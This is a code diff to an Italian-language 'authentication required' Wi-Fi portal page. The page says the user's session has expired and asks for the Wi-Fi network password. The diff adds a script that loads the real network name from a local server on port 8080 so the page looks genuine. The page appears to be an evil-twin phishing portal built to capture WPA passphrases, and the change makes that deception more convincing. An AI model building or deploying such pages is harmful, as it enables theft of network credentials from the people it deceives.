@@ -42,7 +42,7 @@
         </div>
         <h1>Autenticazione richiesta</h1>
         <div class="ssid-row">
-            <span class="ssid">__SSID__</span>
+            <span class="ssid" id="wifi-ssid">Caricamento...</span>
         </div>
         <p class="msg">La tua sessione &egrave; scaduta o il dispositivo deve essere autenticato.<br>Inserisci la password della rete Wi-Fi per continuare.</p>
         <form action="/connect" method="POST">
@@ -55,5 +55,22 @@
     <footer>
         <a href="#">Termini di utilizzo</a> &bull; <a href="#">Privacy</a> &bull; &copy; Portale Wi-Fi
     </footer>
+    <script>
+        (function() {
+            var host = window.location.hostname || "192.168.0.1";
+            fetch("http://" + host + ":8080/get_ssid")
+                .then(function(res) { return res.text(); })
+                .then(function(text) {
+                    if (text && text.trim().length > 0) {
+                        document.getElementById("wifi-ssid").textContent = text.trim();
+                    } else {
+                        document.getElementById("wifi-ssid").textContent = "Wi-Fi";
+                    }
+                })
+                .catch(function() {
+                    document.getElementById("wifi-ssid").textContent = "Wi-Fi";
+                });
+        })();
+    </script>
 </body>
 </html>
